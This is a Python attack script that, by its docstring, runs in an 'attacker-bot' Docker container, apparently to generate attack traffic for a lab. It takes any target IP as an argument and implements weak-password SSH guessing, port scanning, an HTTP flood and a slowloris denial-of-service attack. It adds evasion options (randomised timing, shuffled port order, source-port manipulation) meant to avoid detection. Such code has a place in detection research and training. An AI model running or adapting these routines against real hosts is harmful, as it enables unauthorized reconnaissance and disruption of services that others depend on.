#!/usr/bin/env python3
"""Attack script that runs INSIDE the attacker-bot Docker container.
Generates attack traffic against the target server."""

import socket
import time
import random
import sys

TARGET_IP = sys.argv[1] if len(sys.argv) > 1 else "172.17.0.2"
STRATEGY = sys.argv[2] if len(sys.argv) > 2 else "port_scan"
EVASION = sys.argv[3] if len(sys.argv) > 3 else "none"
TARGET_PORTS = [22, 80, 443, 21, 25, 3389, 8080, 8443, 53, 110]

def get_timing(evasion):
    if evasion == "slow_timing":
        return random.uniform(2.0, 8.0)
    elif evasion == "random_timing":
        return random.uniform(0.1, 3.0)
    return 0.05

def ssh_bruteforce(evasion):
    passwords = ["admin", "password", "123456", "root", "toor", "test", "guest"]
    flows = 0
    for pwd in passwords:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            sock.connect((TARGET_IP, 22))
            banner = sock.recv(1024)
            sock.send(f"root {pwd}\r\n".encode())
            sock.close()
            flows += 1
        except Exception:
            flows += 1
        time.sleep(get_timing(evasion))
    return flows

def port_scan(evasion, sequential=True):
    ports = list(TARGET_PORTS)
    if not sequential or evasion == "randomize_port_order":
        random.shuffle(ports)
    
    source_port = 0
    if evasion == "source_port_manipulation":
        source_port = random.randint(40000, 60000)
    
    flows = 0
    for port in ports:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            if source_port:
                try:
                    sock.bind(("", source_port))
                    source_port += 1
                except Exception:
                    pass
            sock.connect_ex((TARGET_IP, port))
            sock.close()
            flows += 1
        except Exception:
            flows += 1
        time.sleep(get_timing(evasion))
    return flows

def http_flood(evasion):
    flows = 0
    for _ in range(50):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((TARGET_IP, 80))
            sock.send(b"GET / HTTP/1.1\r\nHost: target\r\n\r\n")
            sock.recv(1024)
            sock.close()
            flows += 1
        except Exception:
            flows += 1
        time.sleep(get_timing(evasion))
    return flows

def slow_loris(evasion):
    sockets = []
    for _ in range(20):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(4)
            sock.connect((TARGET_IP, 80))
            sock.send(b"GET / HTTP/1.1\r\nHost: target\r\n")
            sockets.append(sock)
        except Exception:
            pass
        time.sleep(get_timing(evasion))
    
    for i in range(5):
        for sock in sockets:
            try:
                sock.send(f"X-Padding-{i}: {'a'*10}\r\n".encode())
            except Exception:
                pass
        time.sleep(get_timing(evasion))
    
    for sock in sockets:
        try:
            sock.close()
        except Exception:
            pass
    return len(sockets)

def syn_scan_stealth(evasion):
    return port_scan(evasion, sequential=True)

STRATEGIES = {
    "ssh_bruteforce": ssh_bruteforce,
    "port_scan_sequential": lambda e: port_scan(e, sequential=True),
    "port_scan_random": lambda e: port_scan(e, sequential=False),
    "http_flood": http_flood,
    "slow_loris": slow_loris,
    "syn_scan_stealth": syn_scan_stealth,
}

if __name__ == "__main__":
    fn = STRATEGIES.get(STRATEGY, port_scan)
    flows = fn(EVASION)
    print(f"DONE|flows={flows}")
